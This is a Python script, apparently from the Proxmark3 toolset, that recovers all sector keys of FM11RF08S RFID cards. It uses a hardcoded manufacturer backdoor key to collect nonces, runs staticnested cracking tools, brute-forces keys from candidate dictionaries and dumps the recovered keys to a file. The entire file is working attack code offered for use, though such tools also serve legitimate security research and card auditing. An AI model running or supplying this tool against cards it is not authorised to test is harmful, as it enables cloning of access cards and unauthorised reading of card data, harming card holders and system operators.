#!/usr/bin/env python3

# Combine several attacks to recover all FM11RF08S keys
#
# Conditions:
# * Presence of the backdoor with known key
#
# Duration strongly depends on some key being reused and where.
# Examples:
# * 32 random keys: ~20 min
# * 16 random keys with keyA==keyB in each sector: ~30 min
# * 24 random keys, some reused across sectors: <1 min
#
# Doegox, 2024

import time
import subprocess
import argparse
# pip install ansicolors
from colors import color
import pm3
from output_grabber import OutputGrabber

BACKDOOR_RF08S = "A396EFA4E24F"
NUM_SECTORS = 16
TOOLS_PATH = "tools/mfc/card_only"
STATICNESTED_1NT = f"{TOOLS_PATH}/staticnested_1nt"
STATICNESTED_2X1NT = f"{TOOLS_PATH}/staticnested_2x1nt_rf08s"
STATICNESTED_2X1NT1KEY = f"{TOOLS_PATH}/staticnested_2x1nt_rf08s_1key"

parser = argparse.ArgumentParser(description='A script combining staticnested* tools '
                                 'to recover all keys from a FM11RF08S card.')
parser.add_argument('-x', '--no-init-check', action='store_true', help='Do not run an initial fchk for default keys')
parser.add_argument('-y', '--no-final-check', action='store_true', help='Do not run a final fchk with the found keys')
parser.add_argument('-d', '--debug', action='store_true', help='Enable debug mode')
args = parser.parse_args()

start_time = time.time()
out = OutputGrabber()
p = pm3.pm3()

restore_color = False
with out:
    p.console("prefs get color")
    p.console("prefs set color --off")
for line in out.captured_output.split('\n'):
    if "ansi" in line:
        restore_color = True
with out:
    p.console("hf 14a read")
uid = None
for line in out.captured_output.split('\n'):
    if "UID:" in line:
        uid = int(line[10:].replace(' ', ''), 16)
if uid is None:
    print("Card not found")
    if restore_color:
        with out:
            p.console("prefs set color --ansi")
    exit()
print("UID: " + color(f"{uid:08X}", fg="green"))


def print_key(sec, key_type, key):
    kt = ['A', 'B'][key_type]
    print(f"Sector {sec:2} key{kt} = " + color(key, fg="green"))


found_keys = [["", ""] for _ in range(NUM_SECTORS)]
if not args.no_init_check:
    print("Checking default keys...")
    with out:
        p.console("hf mf fchk")
    for line in out.captured_output.split('\n'):
        if "[+]  0" in line:
            res = [x.strip() for x in line.split('|')]
            sec = int(res[0][4:])
            if res[3] == '1':
                found_keys[sec][0] = res[2]
                print_key(sec, 0, found_keys[sec][0])
            if res[5] == '1':
                found_keys[sec][1] = res[4]
                print_key(sec, 1, found_keys[sec][1])

nt = [["", ""] for _ in range(NUM_SECTORS)]
nt_enc = [["", ""] for _ in range(NUM_SECTORS)]
par_err = [["", ""] for _ in range(NUM_SECTORS)]
print("Getting nonces...")
with out:
    for sec in range(NUM_SECTORS):
        blk = sec * 4
        if found_keys[sec][0] == "" or found_keys[sec][1] == "":
            # Even if one key already found, we'll need both nt
            for key_type in [0, 1]:
                cmd = f"hf mf isen -n1 --blk {blk} -c {key_type+4} --key {BACKDOOR_RF08S}"
                p.console(cmd)
                cmd += f" --c2 {key_type}"
                p.console(cmd)
print("Processing traces...")
for line in out.captured_output.split('\n'):
    if "nested cmd: 64" in line or "nested cmd: 65" in line:
        sec = int(line[24:26], 16)//4
        key_type = int(line[21:23], 16) - 0x64
        data = line[65:73]
        nt[sec][key_type] = data
    if "nested cmd: 60" in line or "nested cmd: 61" in line:
        sec = int(line[24:26], 16)//4
        key_type = int(line[21:23], 16) - 0x60
        data = line[108:116]
        nt_enc[sec][key_type] = data
        data = line[128:136]
        par_err[sec][key_type] = data

print("Running staticnested_1nt & 2x1nt when doable...")
keys = [[set(), set()] for _ in range(NUM_SECTORS)]
all_keys = set()
duplicates = set()
# Availability of filtered dicts
filtered_dicts = [[False, False] for _ in range(NUM_SECTORS)]
for sec in range(NUM_SECTORS):
    if found_keys[sec][0] != "" and found_keys[sec][1] != "":
        continue
    if found_keys[sec][0] == "" and found_keys[sec][1] == "" and nt[sec][0] != nt[sec][1]:
        for key_type in [0, 1]:
            cmd = [STATICNESTED_1NT, f"{uid:08X}", f"{sec}",
                   nt[sec][key_type], nt_enc[sec][key_type], par_err[sec][key_type]]
            if args.debug:
                print(' '.join(cmd))
            subprocess.run(cmd, capture_output=True)
        cmd = [STATICNESTED_2X1NT,
               f"keys_{uid:08x}_{sec:02}_{nt[sec][0]}.dic", f"keys_{uid:08x}_{sec:02}_{nt[sec][1]}.dic"]
        if args.debug:
            print(' '.join(cmd))
        subprocess.run(cmd, capture_output=True)
        filtered_dicts[sec][key_type] = True
        for key_type in [0, 1]:
            with (open(f"keys_{uid:08x}_{sec:02}_{nt[sec][key_type]}_filtered.dic")) as f:
                keys_set = set()
                while line := f.readline().rstrip():
                    if line not in keys_set:
                        keys_set.add(line)
                keys[sec][key_type] = keys_set
                duplicates.update(all_keys.intersection(keys_set))
                all_keys.update(keys_set)
    else:  # one key not found or both identical
        if found_keys[sec][0] == "":
            key_type = 0
        else:
            key_type = 1
        cmd = [STATICNESTED_1NT, f"{uid:08X}", f"{sec}",
               nt[sec][key_type], nt_enc[sec][key_type], par_err[sec][key_type]]
        if args.debug:
            print(' '.join(cmd))
        subprocess.run(cmd, capture_output=True)
        with (open(f"keys_{uid:08x}_{sec:02}_{nt[sec][key_type]}.dic")) as f:
            keys_set = set()
            while line := f.readline().rstrip():
                if line not in keys_set:
                    keys_set.add(line)
            keys[sec][key_type] = keys_set
            duplicates.update(all_keys.intersection(keys_set))
            all_keys.update(keys_set)

print("Looking for common keys across sectors...")
keys_filtered = [[set(), set()] for _ in range(NUM_SECTORS)]
for dup in duplicates:
    for sec in range(NUM_SECTORS):
        for key_type in [0, 1]:
            if dup in keys[sec][key_type]:
                keys_filtered[sec][key_type].add(dup)
                if nt[sec][0] == nt[sec][1] and key_type == 0 and keys[sec][1] == set() and found_keys[sec][1] == "":
                    keys_filtered[sec][1].add(dup)
                    continue

# Availability of duplicates dicts
duplicates_dicts = [[False, False] for _ in range(NUM_SECTORS)]
first = True
for sec in range(NUM_SECTORS):
    for key_type in [0, 1]:
        if len(keys_filtered[sec][key_type]) > 0:
            if first:
                print("Saving duplicates dicts...")
                first = False
            with (open(f"keys_{uid:08x}_{sec:02}_{nt[sec][key_type]}_duplicates.dic", "w")) as f:
                for k in keys_filtered[sec][key_type]:
                    f.write(f"{k}\n")
            duplicates_dicts[sec][key_type] = True

abort = False
print("Brute-forcing keys... Press any key to interrupt")
for sec in range(NUM_SECTORS):
    for key_type in [0, 1]:
        # If we have a duplicates dict
        # note: we skip if we already know one key
        # as using 2x1nt1key later will be faster
        if found_keys[sec][0] == "" and found_keys[sec][1] == "" and duplicates_dicts[sec][key_type]:
            kt = ['a', 'b'][key_type]
            dic = f"keys_{uid:08x}_{sec:02}_{nt[sec][key_type]}_duplicates.dic"
            cmd = f"hf mf fchk --blk {sec * 4} -{kt} -f {dic} --no-default"
            if args.debug:
                print(cmd)
            with out:
                p.console(cmd)
            for line in out.captured_output.split('\n'):
                if "aborted via keyboard" in line:
                    abort = True
                if "found:" in line:
                    found_keys[sec][key_type] = line[30:]
                    print_key(sec, key_type, found_keys[sec][key_type])
                    if nt[sec][0] == nt[sec][1] and found_keys[sec][key_type ^ 1] == "":
                        found_keys[sec][key_type ^ 1] = found_keys[sec][key_type]
                        print_key(sec, key_type ^ 1, found_keys[sec][key_type ^ 1])
        if abort:
            break
    if abort:
        break

    for key_type in [0, 1]:
        # If we have a filtered dict
        # note: we skip if we already know one key
        # as using 2x1nt1key later will be faster
        if found_keys[sec][0] == "" and found_keys[sec][1] == "" and filtered_dicts[sec][key_type]:
            # Use filtered dict
            kt = ['a', 'b'][key_type]
            dic = f"keys_{uid:08x}_{sec:02}_{nt[sec][key_type]}_filtered.dic"
            cmd = f"hf mf fchk --blk {sec * 4} -{kt} -f {dic} --no-default"
            if args.debug:
                print(cmd)
            with out:
                p.console(cmd)
            for line in out.captured_output.split('\n'):
                if "aborted via keyboard" in line:
                    abort = True
                if "found:" in line:
                    found_keys[sec][key_type] = line[30:]
                    print_key(sec, key_type, found_keys[sec][key_type])
        if abort:
            break
    if abort:
        break

    # If one common key for the sector
    if found_keys[sec][0] == "" and found_keys[sec][1] == "" and nt[sec][0] == nt[sec][1]:
        key_type = 0
        # Use regular dict
        kt = ['a', 'b'][key_type]
        dic = f"keys_{uid:08x}_{sec:02}_{nt[sec][key_type]}.dic"
        cmd = f"hf mf fchk --blk {sec * 4} -{kt} -f {dic} --no-default"
        if args.debug:
            print(cmd)
        with out:
            p.console(cmd)
        for line in out.captured_output.split('\n'):
            if "aborted via keyboard" in line:
                abort = True
            if "found:" in line:
                found_keys[sec][0] = line[30:]
                found_keys[sec][1] = line[30:]
                print_key(sec, 0, found_keys[sec][key_type])
                print_key(sec, 1, found_keys[sec][key_type])
    if abort:
        break

    # If one key is missing, use the other one with 2x1nt1key
    if ((found_keys[sec][0] == "") ^ (found_keys[sec][1] == "")) and nt[sec][0] != nt[sec][1]:
        if (found_keys[sec][0] == ""):
            key_type_source = 1
            key_type_target = 0
        else:
            key_type_source = 0
            key_type_target = 1
        if duplicates_dicts[sec][key_type_target]:
            dic = f"keys_{uid:08x}_{sec:02}_{nt[sec][key_type_target]}_duplicates.dic"
        elif filtered_dicts[sec][key_type_target]:
            dic = f"keys_{uid:08x}_{sec:02}_{nt[sec][key_type_target]}_filtered.dic"
        else:
            dic = f"keys_{uid:08x}_{sec:02}_{nt[sec][key_type_target]}.dic"
        cmd = [STATICNESTED_2X1NT1KEY, nt[sec][key_type_source], found_keys[sec][key_type_source], dic]
        if args.debug:
            print(' '.join(cmd))
        result = subprocess.run(cmd, capture_output=True, text=True).stdout
        keys = set()
        for line in result.split('\n'):
            # print(line)
            if "MATCH:" in line:
                keys.add(line[12:])
        if len(keys) > 1:
            kt = ['a', 'b'][key_type_target]
            cmd = f"hf mf fchk --blk {sec * 4} -{kt} --no-default"
            for k in keys:
                cmd += f" -k {k}"
            if args.debug:
                print(cmd)
            with out:
                p.console(cmd)
            for line in out.captured_output.split('\n'):
                if "aborted via keyboard" in line:
                    abort = True
                if "found:" in line:
                    found_keys[sec][key_type_target] = line[30:]
        elif len(keys) == 1:
            found_keys[sec][key_type_target] = keys.pop()
        if found_keys[sec][key_type_target] != "":
            print_key(sec, key_type_target, found_keys[sec][key_type_target])
    if abort:
        break
if restore_color:
    with out:
        p.console("prefs set color --ansi")

if abort:
    print("Brute-forcing phase aborted via keyboard!")
    args.no_final_check = True

if args.no_final_check:
    plus = "[" + color("+", fg="green") + "] "
    print()
    print(plus + color("found keys:", fg="green"))
    print()
    print(plus + "-----+-----+--------------+---+--------------+----")
    print(plus + " Sec | Blk | key A        |res| key B        |res")
    print(plus + "-----+-----+--------------+---+--------------+----")
    for sec in range(NUM_SECTORS):
        keys = [["", 0], ["", 0]]
        for key_type in [0, 1]:
            if found_keys[sec][key_type] == "":
                keys[key_type] = [color("------------", fg="red"), color("0", fg="red")]
            else:
                keys[key_type] = [color(found_keys[sec][0], fg="green"), color("1", fg="green")]
        print(plus + f" {sec:03} | {sec*4+3:03} | {keys[0][0]} | {keys[0][1]} | {keys[1][0]} | {keys[1][1]} ")
    print(plus + "-----+-----+--------------+---+--------------+----")
    print(plus + "( " + color("0", fg="red") + ":Failed / " +
          color("1", fg="green") + ":Success )")
    print()
    print(plus + "Generating binary key file")
    keyfile = f"hf-mf-{uid:08X}-key.bin"
    unknown = False
    with (open(keyfile, "wb")) as f:
        for key_type in [0, 1]:
            for sec in range(NUM_SECTORS):
                k = found_keys[sec][key_type]
                if k == "":
                    k = "FFFFFFFFFFFF"
                    unknown = True
                f.write(bytes.fromhex(k))
    print(plus + "Found keys have been dumped to `" + color(keyfile, fg="yellow")+"`")
    if unknown:
        print("[" + color("=", fg="yellow") + "]  --[ " + color("FFFFFFFFFFFF", fg="yellow") +
              " ]-- has been inserted for unknown keys")
else:
    print("Letting fchk do a final dump, just for confirmation and display...")
    keys_set = set([i for sl in found_keys for i in sl if i != ""])
    with (open(f"keys_{uid:08x}.dic", "w")) as f:
        for k in keys_set:
            f.write(f"{k}\n")
    cmd = f"hf mf fchk -f keys_{uid:08x}.dic --no-default --dump"
    if args.debug:
        print(cmd)
    with out:
        p.console(cmd)
    for line in out.captured_output.split('\n'):
        print(line)

elapsed_time = time.time() - start_time
minutes = int(elapsed_time // 60)
seconds = int(elapsed_time % 60)
print("--- " + color(minutes, fg="yellow") + " minutes " +
      color(seconds, fg="yellow") + " seconds ---")
